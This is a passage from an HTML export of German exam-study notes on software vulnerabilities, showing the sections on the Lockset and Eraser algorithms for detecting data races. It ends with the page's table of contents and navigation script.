MathJax_Main;">sharedData</span><span class="mo" id="MathJax-Span-65" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-66" style="font-family: MathJax_Main; padding-left: 0.272em;">=</span><span class="mo" id="MathJax-Span-67" style="font-family: MathJax_Main; padding-left: 0.272em;">{</span><span class="mtext" id="MathJax-Span-68" style="font-family: MathJax_Main;">lock1</span><span class="mo" id="MathJax-Span-69" style="font-family: MathJax_Main;">}</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo stretchy="false">(</mo><mtext>sharedData</mtext><mo stretchy="false">)</mo><mo>=</mo><mo fence="false" stretchy="false">{</mo><mtext>lock1</mtext><mo fence="false" stretchy="false">}</mo></math></span></span><script type="math/tex" id="MathJax-Element-15">C(\text{sharedData}) = \{ \text{lock1} \}</script></span></li>
<li>Für <code>getSharedData()</code>: <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-16-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>C</mi><mo stretchy=&quot;false&quot;>(</mo><mtext>sharedData</mtext><mo stretchy=&quot;false&quot;>)</mo><mo>=</mo><mo fence=&quot;false&quot; stretchy=&quot;false&quot;>{</mo><mtext>lock2</mtext><mo fence=&quot;false&quot; stretchy=&quot;false&quot;>}</mo></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-70" style="width: 12.88em; display: inline-block;"><span style="display: inline-block; position: relative; width: 11.102em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.457em, 1011.05em, 2.804em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-71"><span class="mi" id="MathJax-Span-72" style="font-family: MathJax_Math-italic;">C<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.057em;"></span></span><span class="mo" id="MathJax-Span-73" style="font-family: MathJax_Main;">(</span><span class="mtext" id="MathJax-Span-74" style="font-family: MathJax_Main;">sharedData</span><span class="mo" id="MathJax-Span-75" style="font-family: MathJax_Main;">)</span><span class="mo" id="MathJax-Span-76" style="font-family: MathJax_Main; padding-left: 0.272em;">=</span><span class="mo" id="MathJax-Span-77" style="font-family: MathJax_Main; padding-left: 0.272em;">{</span><span class="mtext" id="MathJax-Span-78" style="font-family: MathJax_Main;">lock2</span><span class="mo" id="MathJax-Span-79" style="font-family: MathJax_Main;">}</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.372em; border-left: 0px solid; width: 0px; height: 1.316em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>C</mi><mo stretchy="false">(</mo><mtext>sharedData</mtext><mo stretchy="false">)</mo><mo>=</mo><mo fence="false" stretchy="false">{</mo><mtext>lock2</mtext><mo fence="false" stretchy="false">}</mo></math></span></span><script type="math/tex" id="MathJax-Element-16">C(\text{sharedData}) = \{ \text{lock2} \}</script></span></li>
</ul>
</li>
</ul><p>Wenn ein Thread <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-17-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi><mn>1</mn></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-80" style="width: 1.026em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.865em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.81em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-81"><span class="mi" id="MathJax-Span-82" style="font-family: MathJax_Math-italic;">t</span><span class="mn" id="MathJax-Span-83" style="font-family: MathJax_Main;">1</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi><mn>1</mn></math></span></span><script type="math/tex" id="MathJax-Element-17">t1</script></span> <code>updateSharedData()</code> aufruft und ein anderer Thread <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-18-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi><mn>2</mn></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-84" style="width: 1.026em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.865em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.81em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-85"><span class="mi" id="MathJax-Span-86" style="font-family: MathJax_Math-italic;">t</span><span class="mn" id="MathJax-Span-87" style="font-family: MathJax_Main;">2</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi><mn>2</mn></math></span></span><script type="math/tex" id="MathJax-Element-18">t2</script></span> <code>getSharedData()</code> aufruft, würde der Lockset-Algorithmus überprüfen, ob <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-19-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mi>t</mi><mn>2</mn></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-88" style="width: 1.026em; display: inline-block;"><span style="display: inline-block; position: relative; width: 0.865em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.565em, 1000.81em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-89"><span class="mi" id="MathJax-Span-90" style="font-family: MathJax_Math-italic;">t</span><span class="mn" id="MathJax-Span-91" style="font-family: MathJax_Main;">2</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>t</mi><mn>2</mn></math></span></span><script type="math/tex" id="MathJax-Element-19">t2</script></span> die erforderliche Sperre <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span class="MathJax" id="MathJax-Element-20-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mtext>lock1</mtext></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-92" style="width: 2.643em; display: inline-block;"><span style="display: inline-block; position: relative; width: 2.266em; height: 0px; font-size: 116%;"><span style="position: absolute; clip: rect(1.511em, 1002.21em, 2.535em, -999.997em); top: -2.368em; left: 0em;"><span class="mrow" id="MathJax-Span-93"><span class="mtext" id="MathJax-Span-94" style="font-family: MathJax_Main;">lock1</span></span><span style="display: inline-block; width: 0px; height: 2.373em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.059em; border-left: 0px solid; width: 0px; height: 0.941em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mtext>lock1</mtext></math></span></span><script type="math/tex" id="MathJax-Element-20">\text{lock1}</script></span> für den Zugriff auf <code>sharedData</code> hält. Wenn nicht, würde eine Warnung ausgegeben werden, da dies eine potenzielle Race Condition darstellt.</p><h3 id="Anwendung-und-Einschränkungen"><a class="anchor hidden-xs" href="#Anwendung-und-Einschränkungen" title="Anwendung-und-Einschränkungen"><i class="fa fa-link"></i></a>Anwendung und Einschränkungen:</h3><ul>
<li>
<p><strong>Vorteile</strong>: Der Lockset-Algorithmus ermöglicht eine genauere Erkennung von Race Conditions während der Programmausführung im Vergleich zu rein statischen Analysemethoden.</p>
</li>
<li>
<p><strong>Nachteile</strong>: Er ist rechenintensiv und kann die Laufzeit des Programms beeinträchtigen. Außerdem können komplexe Datenstrukturen die Analyse erschweren, da es schwierig sein kann, genau zu verfolgen, welche Sperren für welche Variablen gehalten werden.</p>
</li>
</ul><h3 id="Eraser-Algorithmus"><a class="anchor hidden-xs" href="#Eraser-Algorithmus" title="Eraser-Algorithmus"><i class="fa fa-link"></i></a>Eraser-Algorithmus</h3><img src="https://codi.ide3.de/uploads/upload_df7ae7069f6d3305af64776d6a18e560.png" width="50%"><ul>
<li>
<p><strong>Berechnung der Locksets für Shared und Shared-Modified</strong>:<br>
Das Eraser-Tool berechnet zwei Arten von Locksets:</p>
<ul>
<li><strong>Shared</strong>: Diese repräsentieren Sperren, die von Threads gehalten werden, die gemeinsam genutzte Variablen lesen oder schreiben.</li>
<li><strong>Shared-Modified</strong>: Diese repräsentieren Sperren, die von Threads gehalten werden, die gemeinsam genutzte Variablen geändert haben.</li>
</ul>
</li>
<li>
<p><strong>Fehler werden nur im Zustand Shared-Modified gemeldet</strong>:<br>
Das Eraser-Tool identifiziert potenzielle Race Conditions nur dann als Fehler, wenn eine gemeinsam genutzte Variable im Zustand “Shared-Modified” ist. Das bedeutet, dass mindestens ein Thread diese Variable geändert hat, während ein anderer Thread gleichzeitig darauf zugreifen könnte.</p>
</li>
<li>
<p><strong>Dynamische Instrumentierung durch binäre Modifikation</strong>:<br>
Um diese Analyse durchzuführen, modifiziert Eraser das Programm dynamisch durch binäre Instrumentierung. Das bedeutet, dass es den Programmcode während der Ausführung manipuliert, um Zugriffe auf gemeinsam genutzte Variablen zu überwachen und die entsprechenden Locksets zu aktualisieren.</p>
</li>
</ul></div>
    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
        <div class="pull-right dropdown">
            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
                <i class="fa fa-bars"></i>
            </a>
            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
                <div class="toc"><ul class="nav">
<li class=""><a href="#Schwachstellen-Zusammenfassung" title="Schwachstellen Zusammenfassung">Schwachstellen Zusammenfassung</a></li>
<li><a href="#Buffer--und-Heapoverflows" title="Buffer- und Heapoverflows">Buffer- und Heapoverflows</a><ul class="nav">
<li><a href="#Speicherkorruption" title="Speicherkorruption">Speicherkorruption</a></li>
<li><a href="#Beispiel" title="Beispiel">Beispiel</a><ul class="nav">
<li><a href="#Erklärung-des-Bufferoverflow" title="Erklärung des Bufferoverflow">Erklärung des Bufferoverflow</a></li>
<li><a href="#Abbildung-Beispiel" title="Abbildung Beispiel">Abbildung Beispiel</a></li>
</ul>
</li>
<li><a href="#tip1" title=""></a><ul class="nav">
<li><a href="#Vermeidung-von-Buffer-Overflows" title="Vermeidung von Buffer Overflows">Vermeidung von Buffer Overflows</a></li>
</ul>
</li>
<li><a href="#Shellcode" title="Shellcode">Shellcode</a></li>
<li><a href="#NOP-Sled" title="NOP Sled">NOP Sled</a></li>
<li><a href="#Heapoverflow" title="Heapoverflow">Heapoverflow</a></li>
<li><a href="#Canaries" title="Canaries">Canaries</a></li>
<li><a href="#Gegenmaßnahmen-zu-Overflows" title="Gegenmaßnahmen zu Overflows">Gegenmaßnahmen zu Overflows</a><ul class="nav">
<li><a href="#Speicherschutz-in-Betriebssystemen-und-Hardware" title="Speicherschutz in Betriebssystemen und Hardware">Speicherschutz in Betriebssystemen und Hardware</a></li>
<li><a href="#Weitere-Techniken-zum-Schutz-vor-Speicherkorruption" title="Weitere Techniken zum Schutz vor Speicherkorruption">Weitere Techniken zum Schutz vor Speicherkorruption</a></li>
</ul>
</li>
<li><a href="#Erkennen-von-Overflows" title="Erkennen von Overflows">Erkennen von Overflows</a><ul class="nav">
<li><a href="#Anzeichen-für-Bufferoverflows-in-Klausur" title="Anzeichen für Bufferoverflows in Klausur:">Anzeichen für Bufferoverflows in Klausur:</a></li>
<li><a href="#Anzeichen-für-Heapoverflows-in-Klausur" title="Anzeichen für Heapoverflows in Klausur:">Anzeichen für Heapoverflows in Klausur:</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Code-Injection" title="Code-Injection">Code-Injection</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Operating-System-Befehlsinjektion-Erklärung-und-Beispiel" title="Operating System Befehlsinjektion: Erklärung und Beispiel">Operating System Befehlsinjektion: Erklärung und Beispiel</a></li>
</ul>
</li>
<li><a href="#Erkennung-von-Injections-in-der-Klausur" title="Erkennung von Injections in der Klausur">Erkennung von Injections in der Klausur</a><ul class="nav">
<li><a href="#Zusammenfassung" title="Zusammenfassung">Zusammenfassung</a></li>
</ul>
</li>
<li><a href="#Umgebungsvariablen-und-ihre-Risiken" title="Umgebungsvariablen und ihre Risiken">Umgebungsvariablen und ihre Risiken</a></li>
</ul>
</li>
<li><a href="#SQL-Injections-SQLi" title="SQL-Injections (SQLi)">SQL-Injections (SQLi)</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Klassifizierung-von-SQL-Injections" title="Klassifizierung von SQL-Injections">Klassifizierung von SQL-Injections</a></li>
<li><a href="#Potenzielle-Schwachstellen" title="Potenzielle Schwachstellen:">Potenzielle Schwachstellen:</a></li>
<li><a href="#Formen-des-injizierten-SQL-Codes" title="Formen des injizierten SQL-Codes">Formen des injizierten SQL-Codes</a></li>
<li><a href="#Prävention-und-Detektion-von-SQL-Injection-Schwachstellen" title="Prävention und Detektion von SQL-Injection-Schwachstellen">Prävention und Detektion von SQL-Injection-Schwachstellen</a></li>
<li><a href="#Erkennung-von-SQL-Injections-in-der-Klausur" title="Erkennung von SQL-Injections in der Klausur">Erkennung von SQL-Injections in der Klausur</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Race-Conditions-und-TOCTOU-Time-of-Check-to-Time-of-Use" title="Race Conditions und TOCTOU (Time-of-Check to Time-of-Use)">Race Conditions und TOCTOU (Time-of-Check to Time-of-Use)</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Sicherheitsrisiken-und-Angriffsszenarien" title="Sicherheitsrisiken und Angriffsszenarien">Sicherheitsrisiken und Angriffsszenarien</a></li>
<li><a href="#Ausnutzung-von-TOCTOU-Time-of-Check-to-Time-of-Use" title="Ausnutzung von TOCTOU (Time-of-Check to Time-of-Use)">Ausnutzung von TOCTOU (Time-of-Check to Time-of-Use)</a></li>
<li><a href="#Race-Conditions-im-Kontext-von-Code" title="Race Conditions im Kontext von Code">Race Conditions im Kontext von Code</a></li>
<li><a href="#Lösungen-und-Prävention" title="Lösungen und Prävention">Lösungen und Prävention</a></li>
<li><a href="#Beispiele-für-Angriffsszenarien" title="Beispiele für Angriffsszenarien">Beispiele für Angriffsszenarien</a></li>
</ul>
</li>
<li><a href="#Race-Conditions-mit-Time-of-Check-to-Time-of-Use-TOCTOU-in-Klausur-erkennen" title="Race Conditions mit Time-of-Check to Time-of-Use (TOCTOU) in Klausur erkennen">Race Conditions mit Time-of-Check to Time-of-Use (TOCTOU) in Klausur erkennen</a><ul class="nav">
<li><a href="#Permission-Races1" title="Permission Races">Permission Races</a></li>
<li><a href="#Ownership-Races1" title="Ownership Races">Ownership Races</a></li>
<li><a href="#Directory-Races" title="Directory Races">Directory Races</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Data-Races" title="Data Races">Data Races</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Problemstellung-Race-Conditions-in-Multi-Threaded-Umgebungen" title="Problemstellung: Race Conditions in Multi-Threaded-Umgebungen">Problemstellung: Race Conditions in Multi-Threaded-Umgebungen</a></li>
<li><a href="#Probleme-im-Multi-Threaded-Kontext" title="Probleme im Multi-Threaded-Kontext">Probleme im Multi-Threaded-Kontext</a></li>
<li><a href="#Warum-sind-Race-Conditions-problematisch" title="Warum sind Race Conditions problematisch?">Warum sind Race Conditions problematisch?</a></li>
<li><a href="#“No-Out-of-thin-air”-Strategie" title="“No Out-of-thin-air” Strategie">“No Out-of-thin-air” Strategie</a></li>
<li><a href="#Data-Races-in-Klausur-erkennen" title="Data Races in Klausur erkennen">Data Races in Klausur erkennen</a></li>
<li><a href="#Lösungen-für-Multi-Threaded-Programmierung" title="Lösungen für Multi-Threaded-Programmierung">Lösungen für Multi-Threaded-Programmierung</a></li>
<li><a href="#Lockset-Algorithmus" title="Lockset-Algorithmus">Lockset-Algorithmus</a></li>
<li><a href="#Anwendung-und-Einschränkungen" title="Anwendung und Einschränkungen:">Anwendung und Einschränkungen:</a></li>
<li><a href="#Eraser-Algorithmus" title="Eraser-Algorithmus">Eraser-Algorithmus</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div><div class="toc-menu" style="">
    <a class="expand-toggle expand-all" href="#">Expand all</a>
    <a class="expand-toggle collapse-all" href="#" style="display: none;">Collapse all</a>
    <a class="back-to-top" href="#">Back to top</a>
    <a class="go-to-bottom" href="#">Go to bottom</a>
</div>
            </ul>
        </div>
    </div>
    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;"  >
        <div class="toc"><ul class="nav">
<li class=""><a href="#Schwachstellen-Zusammenfassung" title="Schwachstellen Zusammenfassung">Schwachstellen Zusammenfassung</a></li>
<li><a href="#Buffer--und-Heapoverflows" title="Buffer- und Heapoverflows">Buffer- und Heapoverflows</a><ul class="nav">
<li><a href="#Speicherkorruption" title="Speicherkorruption">Speicherkorruption</a></li>
<li><a href="#Beispiel" title="Beispiel">Beispiel</a><ul class="nav">
<li><a href="#Erklärung-des-Bufferoverflow" title="Erklärung des Bufferoverflow">Erklärung des Bufferoverflow</a></li>
<li><a href="#Abbildung-Beispiel" title="Abbildung Beispiel">Abbildung Beispiel</a></li>
</ul>
</li>
<li><a href="#tip1" title=""></a><ul class="nav">
<li><a href="#Vermeidung-von-Buffer-Overflows" title="Vermeidung von Buffer Overflows">Vermeidung von Buffer Overflows</a></li>
</ul>
</li>
<li><a href="#Shellcode" title="Shellcode">Shellcode</a></li>
<li><a href="#NOP-Sled" title="NOP Sled">NOP Sled</a></li>
<li><a href="#Heapoverflow" title="Heapoverflow">Heapoverflow</a></li>
<li><a href="#Canaries" title="Canaries">Canaries</a></li>
<li><a href="#Gegenmaßnahmen-zu-Overflows" title="Gegenmaßnahmen zu Overflows">Gegenmaßnahmen zu Overflows</a><ul class="nav">
<li><a href="#Speicherschutz-in-Betriebssystemen-und-Hardware" title="Speicherschutz in Betriebssystemen und Hardware">Speicherschutz in Betriebssystemen und Hardware</a></li>
<li><a href="#Weitere-Techniken-zum-Schutz-vor-Speicherkorruption" title="Weitere Techniken zum Schutz vor Speicherkorruption">Weitere Techniken zum Schutz vor Speicherkorruption</a></li>
</ul>
</li>
<li><a href="#Erkennen-von-Overflows" title="Erkennen von Overflows">Erkennen von Overflows</a><ul class="nav">
<li><a href="#Anzeichen-für-Bufferoverflows-in-Klausur" title="Anzeichen für Bufferoverflows in Klausur:">Anzeichen für Bufferoverflows in Klausur:</a></li>
<li><a href="#Anzeichen-für-Heapoverflows-in-Klausur" title="Anzeichen für Heapoverflows in Klausur:">Anzeichen für Heapoverflows in Klausur:</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Code-Injection" title="Code-Injection">Code-Injection</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Operating-System-Befehlsinjektion-Erklärung-und-Beispiel" title="Operating System Befehlsinjektion: Erklärung und Beispiel">Operating System Befehlsinjektion: Erklärung und Beispiel</a></li>
</ul>
</li>
<li><a href="#Erkennung-von-Injections-in-der-Klausur" title="Erkennung von Injections in der Klausur">Erkennung von Injections in der Klausur</a><ul class="nav">
<li><a href="#Zusammenfassung" title="Zusammenfassung">Zusammenfassung</a></li>
</ul>
</li>
<li><a href="#Umgebungsvariablen-und-ihre-Risiken" title="Umgebungsvariablen und ihre Risiken">Umgebungsvariablen und ihre Risiken</a></li>
</ul>
</li>
<li><a href="#SQL-Injections-SQLi" title="SQL-Injections (SQLi)">SQL-Injections (SQLi)</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Klassifizierung-von-SQL-Injections" title="Klassifizierung von SQL-Injections">Klassifizierung von SQL-Injections</a></li>
<li><a href="#Potenzielle-Schwachstellen" title="Potenzielle Schwachstellen:">Potenzielle Schwachstellen:</a></li>
<li><a href="#Formen-des-injizierten-SQL-Codes" title="Formen des injizierten SQL-Codes">Formen des injizierten SQL-Codes</a></li>
<li><a href="#Prävention-und-Detektion-von-SQL-Injection-Schwachstellen" title="Prävention und Detektion von SQL-Injection-Schwachstellen">Prävention und Detektion von SQL-Injection-Schwachstellen</a></li>
<li><a href="#Erkennung-von-SQL-Injections-in-der-Klausur" title="Erkennung von SQL-Injections in der Klausur">Erkennung von SQL-Injections in der Klausur</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Race-Conditions-und-TOCTOU-Time-of-Check-to-Time-of-Use" title="Race Conditions und TOCTOU (Time-of-Check to Time-of-Use)">Race Conditions und TOCTOU (Time-of-Check to Time-of-Use)</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Sicherheitsrisiken-und-Angriffsszenarien" title="Sicherheitsrisiken und Angriffsszenarien">Sicherheitsrisiken und Angriffsszenarien</a></li>
<li><a href="#Ausnutzung-von-TOCTOU-Time-of-Check-to-Time-of-Use" title="Ausnutzung von TOCTOU (Time-of-Check to Time-of-Use)">Ausnutzung von TOCTOU (Time-of-Check to Time-of-Use)</a></li>
<li><a href="#Race-Conditions-im-Kontext-von-Code" title="Race Conditions im Kontext von Code">Race Conditions im Kontext von Code</a></li>
<li><a href="#Lösungen-und-Prävention" title="Lösungen und Prävention">Lösungen und Prävention</a></li>
<li><a href="#Beispiele-für-Angriffsszenarien" title="Beispiele für Angriffsszenarien">Beispiele für Angriffsszenarien</a></li>
</ul>
</li>
<li><a href="#Race-Conditions-mit-Time-of-Check-to-Time-of-Use-TOCTOU-in-Klausur-erkennen" title="Race Conditions mit Time-of-Check to Time-of-Use (TOCTOU) in Klausur erkennen">Race Conditions mit Time-of-Check to Time-of-Use (TOCTOU) in Klausur erkennen</a><ul class="nav">
<li><a href="#Permission-Races1" title="Permission Races">Permission Races</a></li>
<li><a href="#Ownership-Races1" title="Ownership Races">Ownership Races</a></li>
<li><a href="#Directory-Races" title="Directory Races">Directory Races</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#Data-Races" title="Data Races">Data Races</a><ul class="nav">
<li class="invisable-node"><ul class="nav">
<li><a href="#Problemstellung-Race-Conditions-in-Multi-Threaded-Umgebungen" title="Problemstellung: Race Conditions in Multi-Threaded-Umgebungen">Problemstellung: Race Conditions in Multi-Threaded-Umgebungen</a></li>
<li><a href="#Probleme-im-Multi-Threaded-Kontext" title="Probleme im Multi-Threaded-Kontext">Probleme im Multi-Threaded-Kontext</a></li>
<li><a href="#Warum-sind-Race-Conditions-problematisch" title="Warum sind Race Conditions problematisch?">Warum sind Race Conditions problematisch?</a></li>
<li><a href="#“No-Out-of-thin-air”-Strategie" title="“No Out-of-thin-air” Strategie">“No Out-of-thin-air” Strategie</a></li>
<li><a href="#Data-Races-in-Klausur-erkennen" title="Data Races in Klausur erkennen">Data Races in Klausur erkennen</a></li>
<li><a href="#Lösungen-für-Multi-Threaded-Programmierung" title="Lösungen für Multi-Threaded-Programmierung">Lösungen für Multi-Threaded-Programmierung</a></li>
<li><a href="#Lockset-Algorithmus" title="Lockset-Algorithmus">Lockset-Algorithmus</a></li>
<li><a href="#Anwendung-und-Einschränkungen" title="Anwendung und Einschränkungen:">Anwendung und Einschränkungen:</a></li>
<li><a href="#Eraser-Algorithmus" title="Eraser-Algorithmus">Eraser-Algorithmus</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div><div class="toc-menu" style="">
    <a class="expand-toggle expand-all" href="#">Expand all</a>
    <a class="expand-toggle collapse-all" href="#" style="display: none;">Collapse all</a>
    <a class="back-to-top" href="#">Back to top</a>
    <a class="go-to-bottom" href="#">Go to bottom</a>
</div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.0/js/bootstrap.min.js" integrity="sha256-kJrlY+s09+QoWjpkOrXXwhxeaoDz9FW5SaxF8I0DibQ=" crossorigin="anonymous" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
    <script>
        var markdown = $(".markdown-body");
        //smooth all hash trigger scrolling
        function smoothHashScroll() {
            var hashElements = $("a[href^='#']").toArray();
            for (var i = 0; i < hashElements.length; i++) {
                var element = hashElements[i];
                var $element = $(element);
                var hash = element.hash;
                if (hash) {
                    $element.on('click', function (e) {
                        // store hash
                        var hash = this.hash;
                        if ($(hash).length <= 0) return;
                        // prevent default anchor click behavior
                        e.preventDefault();
                        // animate
                        $('body, html').stop(true, true).animate({
                            scrollTop: $(hash).offset().top
                        }, 100, "linear", function () {
                            // when done, add hash to url
                            // (default click behaviour)
                            window.location.hash = hash;
                        });
                    });
                }
            }
        }

        smoothHashScroll();
        var toc = $('.ui-toc');
        var tocAffix = $('.ui-affix-toc');
        var tocDropdown = $('.ui-toc-dropdown');
        //toc
        tocDropdown.click(function (e) {
            e.stopPropagation();
        });

        var enoughForAffixToc = true;

        function generateScrollspy() {
            $(document.body).scrollspy({
                target: ''
            });
            $(document.body).scrollspy('refresh');
            if (enoughForAffixToc) {
                toc.hide();
                tocAffix.show();
            } else {
                tocAffix.hide();
                toc.show();
            }
            $(document.body).scroll();
        }

        function windowResize() {
            //toc right
            var paddingRight = parseFloat(markdown.css('padding-right'));
            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
            toc.css('right', right + 'px');
            //affix toc left
            var newbool;
            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
            //for ipad or wider device
            if (rightMargin >= 133) {
                newbool = true;
                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
                tocAffix.css('left', left + 'px');
            } else {
                newbool = false;
            }
            if (newbool != enoughForAffixToc) {
                enoughForAffixToc = newbool;
                generateScrollspy();
            }
        }
        $(window).resize(function () {
            windowResize();
        });
        $(document).ready(function () {
            windowResize();
            generateScrollspy();
        });

        //remove hash
        function removeHash() {
            window.location.hash = '';
        }

        var backtotop = $('.back-to-top');
        var gotobottom = $('.go-to-bottom');

        backtotop.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToTop)
                scrollToTop();
            removeHash();
        });
        gotobottom.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToBottom)
                scrollToBottom();
            removeHash();
        });

        var toggle = $('.expand-toggle');
        var tocExpand = false;

        checkExpandToggle();
        toggle.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            tocExpand = !tocExpand;
            checkExpandToggle();
        })

        function checkExpandToggle () {
            var toc = $('.ui-toc-dropdown .toc');
            var toggle = $('.expand-toggle');
            if (!tocExpand) {
                toc.removeClass('expand');
                toggle.text('Expand all');
            } else {
                toc.addClass('expand');
                toggle.text('Collapse all');
            }
        }

        function scrollToTop() {
            $('body, html').stop(true, true).animate({
                scrollTop: 0
            }, 100, "linear");
        }

        function scrollToBottom() {
            $('body, html').stop(true, true).animate({
                scrollTop: $(document.body)[0].scrollHeight
            }, 100, "linear");
        }
    </script>
</body>

</html>
